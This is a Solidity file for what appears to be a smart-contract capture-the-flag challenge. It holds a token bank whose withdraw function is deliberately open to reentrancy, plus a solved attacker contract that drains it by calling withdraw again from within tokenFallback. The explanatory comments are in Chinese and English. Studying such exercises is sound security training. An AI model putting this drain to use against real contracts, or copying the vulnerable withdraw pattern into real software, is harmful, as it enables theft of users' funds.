// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITokenReceiver {
    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint256 length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(
        address to,
        uint256 value,
        bytes memory data
    ) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(
        address spender,
        uint256 value
    ) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    address public player;

    constructor(address _player) public {
        token = new SimpleERC223Token();
        player = _player;
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
}

// Write your exploit contract below
contract TokenBankAttacker {
    TokenBankChallenge public challenge;

    uint times = 0;

    constructor(address challengeAddress) {
        challenge = TokenBankChallenge(challengeAddress);
    }
    // Write your exploit functions here

    // bank创建了Token，balanceOf(bank) = totalSupply 很多很多
    // bank给了创建者和player一些token
    // 这个token中存放了每一个人的存款，bank是一个特殊的存款人，作为三方银行来存放其他人的存款。
    // token.transfer 可以把调用方的存款转移到to方中。
    // 要让token.balanceOf(bank)的存款为0， 就是要让bank作为普通的存款方，来调用token.transfer,
    // 这个方法在bank.withdraw中实现。我们所要做的就是用attacker调用bank.withdraw, attacker作为合同to，token会回调attacker.tokenFallback方法，在这里再次调用bank.withdraw
    // 前提是我们需要通过require(balanceOf[msg.sender] >= amount); 需要我们先往bank中存一些。
    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data) public {
        // 当player给attacker转账时，会回调这里，不需要处理
        // It will arrive here when player transfer token to attacker in Token, pass directly through times.
        if (times > 0) {
            // 调用bank的withdraw时的回调, 在bank重设balance前，可以继续调用withdraw
            // when attacker.withdraw is invoked, the Token will call tokenFallback here.
            // There will be a loop until the balance of bank in token is zero.
            if (challenge.token().balanceOf(address(challenge)) > 0) {
                challenge.withdraw(value);
            }
        }
        times ++;
    }

    function withdraw(uint amount) public {
        challenge.withdraw(amount);
    }

    function depositToBank(uint amount) public {
        challenge.token().transfer(address(challenge), amount);
    }
}
